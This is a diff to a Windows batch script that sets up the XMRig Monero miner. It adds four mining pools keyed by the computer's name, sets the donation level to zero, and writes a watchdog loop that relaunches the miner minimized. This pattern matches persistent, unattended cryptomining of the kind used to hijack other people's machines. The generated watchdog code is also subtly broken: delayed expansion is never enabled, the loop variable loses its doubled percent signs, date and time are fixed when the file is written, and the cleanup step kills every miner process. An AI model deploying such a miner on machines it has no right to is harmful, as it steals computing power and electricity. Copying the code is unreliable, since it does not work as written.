@@ -160,34 +160,61 @@ echo [*] Generating config file... >> "%temp%\miner_debug.log"
   echo   "cuda": false,
   echo   "pools": [
   echo     {
-  echo       "url": "%POOL%",
+  echo       "url": "gulf.moneroocean.stream:10128",
   echo       "user": "%WALLET%",
   echo       "pass": "%COMPUTERNAME%",
   echo       "keepalive": true,
-  echo       "tls": false
+  echo       "tls": false,
+  echo       "weight": 100
+  echo     },
+  echo     {
+  echo       "url": "pool.supportxmr.com:5555",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false,
+  echo       "weight": 80
+  echo     },
+  echo     {
+  echo       "url": "xmr.2miners.com:2222",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false,
+  echo       "weight": 60
+  echo     },
+  echo     {
+  echo       "url": "xmr.nanopool.org:14444",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false,
+  echo       "weight": 40
   echo     }
-  echo   ]
+  echo   ],
+  echo   "retry-time": 10,
+  echo   "retry-count": 3
   echo }
 ) > "%DEST%\config.json"
 echo [✔] Config file generated. >> "%temp%\miner_debug.log"
 
-REM === Clean Watchdog ===
+REM === Create Watchdog Script ===
 echo [*] Creating watchdog script...
 echo [*] Creating watchdog script... >> "%temp%\miner_debug.log"
 (
   echo @echo off
+  echo set "WATCHDOG_LOG=%DEST%\watchdog.log"
   echo :loop
-  echo REM Check if xmrig.exe is already running
-  echo tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /i "xmrig.exe" ^>nul
-  echo if not errorlevel 1 (
-  echo     REM xmrig.exe is running, wait and check again
+  echo for /f "tokens=1" %%i in ('tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /c /i "xmrig.exe"') do set "XMRIG_COUNT=%%i"
+  echo if !XMRIG_COUNT! GTR 1 (
+  echo     echo [%date% %time%] Multiple xmrig.exe detected, killing extras... ^>^> "!WATCHDOG_LOG!"
+  echo     taskkill /IM xmrig.exe /F ^>nul 2^>^1
   echo     ping 127.0.0.1 -n 11 ^>nul
-  echo     goto loop
   echo )
-  echo REM xmrig.exe is not running, start it
-  echo start "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages ^
-       --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
-  echo REM Wait before checking again
+  echo if !XMRIG_COUNT! EQU 0 (
+  echo     echo [%date% %time%] Starting xmrig.exe... ^>^> "!WATCHDOG_LOG!"
+  echo     start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
+  echo )
   echo ping 127.0.0.1 -n 11 ^>nul
   echo goto loop
 ) > "%DEST%\run_watchdog.bat"
